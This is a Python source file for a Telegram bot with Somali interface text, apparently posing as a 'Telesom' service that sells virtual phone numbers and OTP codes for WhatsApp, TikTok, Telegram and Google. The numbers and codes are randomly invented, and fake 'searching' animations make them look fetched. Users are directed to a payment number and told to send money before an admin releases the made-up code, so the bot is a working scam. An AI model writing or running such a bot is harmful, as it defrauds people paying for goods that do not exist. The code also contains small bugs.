import os, random, asyncio
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

user_data = {}
pending_admin = {}
codes_confirmed = {}

# ===== FSM STATES =====
class CheckCodeState(StatesGroup):
    waiting_code = State()
    waiting_name = State()
    waiting_photo = State()
    waiting_age = State()

# ===== HELPERS =====
def random_number():
    return "063" + "".join(str(random.randint(0,9)) for _ in range(7))

def service_code(service):
    if service=="whatsapp": return "".join(random.choices("0123456789", k=6))
    if service=="tiktok": return "TT" + "".join(random.choices("0123456789", k=5))
    if service=="telegram": return "TG" + "".join(random.choices("0123456789", k=5))
    if service=="google": return "G-" + "".join(random.choices("0123456789", k=8))
    return "".join(random.choices("0123456789", k=6))

async def animation(msg,text,sec=5):
    for i in range(sec):
        dots="."*((i%3)+1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"),KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(F.text=="New Order")
async def new_order(msg: Message):
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL",callback_data="virtual")],
        [InlineKeyboardButton("CARD",callback_data="card")]
    ])
    await msg.answer("Dooro:",reply_markup=kb)

# ===== VIRTUAL =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: CallbackQuery):
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WHATSAPP",callback_data="whatsapp")],
        [InlineKeyboardButton("TIKTOK",callback_data="tiktok")],
        [InlineKeyboardButton("TELEGRAM",callback_data="telegram")],
        [InlineKeyboardButton("GOOGLE",callback_data="google")]
    ])
    await call.message.edit_text("Dooro Adeeg:",reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def service_selected(call: CallbackQuery):
    service = call.data
    user_data[call.from_user.id] = {"service":service,"number":random_number()}
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM",callback_data="confirm_number")],
        [InlineKeyboardButton("CANCEL",callback_data="cancel")]
    ])
    await call.message.edit_text(f"Payment Number: +252907868526\nRiix CONFIRM si Number la helo",reply_markup=kb)

@dp.callback_query(F.data=="cancel")
async def cancel(call: CallbackQuery):
    await call.message.edit_text("Order Cancelled ❌")

# ===== NUMBER CONFIRM =====
@dp.callback_query(F.data=="confirm_number")
async def confirm_number(call: CallbackQuery):
    msg=await call.message.edit_text("NUMBER Searching")
    await animation(msg,"NUMBER Searching",5)
    number=user_data[call.from_user.id]["number"]
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("CONFIRM",callback_data="confirm_otp")],
        [InlineKeyboardButton("CANCEL",callback_data="cancel")]
    ])
    await msg.edit_text(f"Number Found ✅\n{number}\nRiix CONFIRM si OTP loo helo",reply_markup=kb)

# ===== OTP CONFIRM =====
@dp.callback_query(F.data=="confirm_otp")
async def confirm_otp(call: CallbackQuery):
    msg=await call.message.edit_text("OTP Searching")
    await animation(msg,"OTP Searching",5)
    service=user_data[call.from_user.id]["service"]
    code=service_code(service)
    user_data[call.from_user.id]["code"]=code
    pending_admin[call.from_user.id]=True

    kb=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton("APPROVE",callback_data=f"admin_ok_{call.from_user.id}")]])
    await bot.send_message(ADMIN_ID,f"New OTP Request\nUser:{call.from_user.id}\nService:{service}\nNumber:{user_data[call.from_user.id]['number']}\nCode:{code}",reply_markup=kb)
    await asyncio.sleep(10)
    if pending_admin.get(call.from_user.id):
        await call.message.answer("PLEASE SEND MONEY 💵")

@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_approve(call: CallbackQuery):
    uid=int(call.data.split("_")[-1])
    if uid in user_data:
        pending_admin[uid]=False
        codes_confirmed[uid]=user_data[uid]["code"]
        await bot.send_message(uid,f"Payment Confirmed ✅\nOTP Code: {user_data[uid]['code']}")
        await call.message.edit_text("Approved ✅")

# ===== CARD =====
@dp.callback_query(F.data=="card")
async def card_menu(call: CallbackQuery):
    kb=InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP",callback_data="vip")],
        [InlineKeyboardButton("NORMAL",callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:",reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_selected(call: CallbackQuery):
    card_type=call.data
    user_data[call.from_user.id]["card"]=card_type
    await call.message.edit_text(f"{card_type} selected.\nPayment: $15" if card_type=="vip" else "$1")
